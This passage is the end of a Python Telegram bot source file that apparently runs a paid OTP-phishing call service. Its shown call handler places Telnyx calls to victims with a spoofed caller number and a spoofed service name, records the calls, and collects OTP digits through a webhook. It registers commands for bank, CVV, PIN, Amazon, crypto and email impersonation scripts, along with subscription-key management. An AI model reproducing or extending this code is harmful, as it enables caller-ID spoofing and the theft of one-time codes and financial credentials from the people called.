                    update.message.reply_text(f"🔒 Incorrect Language! Available languages: \n\n {options}",parse_mode=ParseMode.HTML)
                    return
                else:
                    telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer",    webhook_url=f"{url}/customv/{number}/{spoof}/{service}/{name}/{otpdigits}/{sid}/{lang}/{chatid}/{tag}")
                    update.message.reply_text(f"🟩 Calling {number} from {spoof}")
            except:
            
                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /call number spoofnumber service name otpdigits scriptid language")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Join here : @wocum to get your subscription",parse_mode=ParseMode.HTML)

def main():
    updater = Updater(token=token, use_context=True)
    dispatcher = updater.dispatcher
    custom_voice = CommandHandler('customvoice', customvoice)
    start_handler = CommandHandler('start', start)
    create_key_handler = CommandHandler('createkey', createkey)
    generate_handler = CommandHandler('generate', generate)
    create_bulk_keys_handler = CommandHandler('createbulk', createbulk)
    reg_key_handler = CommandHandler('redeem', register)
    check_key_handler = CommandHandler('checktime', checktime)
    delete_key_handler = CommandHandler('deletekey', deletekey)
    etoro_handler = CommandHandler('etoro', etoro)
    help_handler = CommandHandler('help', help)
    call_handler = CommandHandler('call', call)
    remind_handler = CommandHandler('remind', remind)
    bank_handler = CommandHandler('bank', bank)
    hangup_handler = CommandHandler('hangup', hangup)
    cvv_handler = CommandHandler('cvv', cvv)
    email_handler = CommandHandler('email', email)
    balance_handler = CommandHandler('balance', balance)
    amazon_handler = CommandHandler('amazon', amazon)
    pin_handler = CommandHandler('pin', pin)
    custom_create = CommandHandler('customtest', createcustom)
    crypto_create = CommandHandler('crypto', crypto)
    script_create = CommandHandler('script', script)
    custom_call = CommandHandler('customcall', customcall)
    sendall_handler = CommandHandler('sendall', sendall)
    testsendall_handler = CommandHandler('testsendall', testsendall)
    bulkbank_handler = CommandHandler('dankbulk', bulkdank)

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('createscript', set_input_handler)],
        states={
            FIRST_INP: [MessageHandler(Filters.text, first_input_by_user)],
            SECOND_INP: [MessageHandler(Filters.text, second_input_by_user)],
            THIRD_INP: [MessageHandler(Filters.text, third_input_by_user)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    dispatcher.add_handler(custom_voice)
    dispatcher.add_handler(balance_handler)
    dispatcher.add_handler(sendall_handler)
    dispatcher.add_handler(bulkbank_handler)
    dispatcher.add_handler(testsendall_handler)
    dispatcher.add_handler(custom_call)
    dispatcher.add_handler(conv_handler)
    dispatcher.add_handler(script_create)
    dispatcher.add_handler(crypto_create)
    dispatcher.add_handler(custom_create)
    dispatcher.add_handler(pin_handler)
    dispatcher.add_handler(start_handler)
    dispatcher.add_handler(create_bulk_keys_handler)
    dispatcher.add_handler(create_key_handler)
    dispatcher.add_handler(generate_handler)
    dispatcher.add_handler(reg_key_handler)
    dispatcher.add_handler(check_key_handler)
    dispatcher.add_handler(delete_key_handler)
    dispatcher.add_handler(call_handler)
    dispatcher.add_handler(bank_handler)
    dispatcher.add_handler(etoro_handler)
    dispatcher.add_handler(cvv_handler)
    dispatcher.add_handler(help_handler)
    dispatcher.add_handler(remind_handler)
    dispatcher.add_handler(email_handler)
    dispatcher.add_handler(amazon_handler)
    updater.start_polling()
    print("Bot is Online")
    
    
if __name__ == '__main__':
    main()
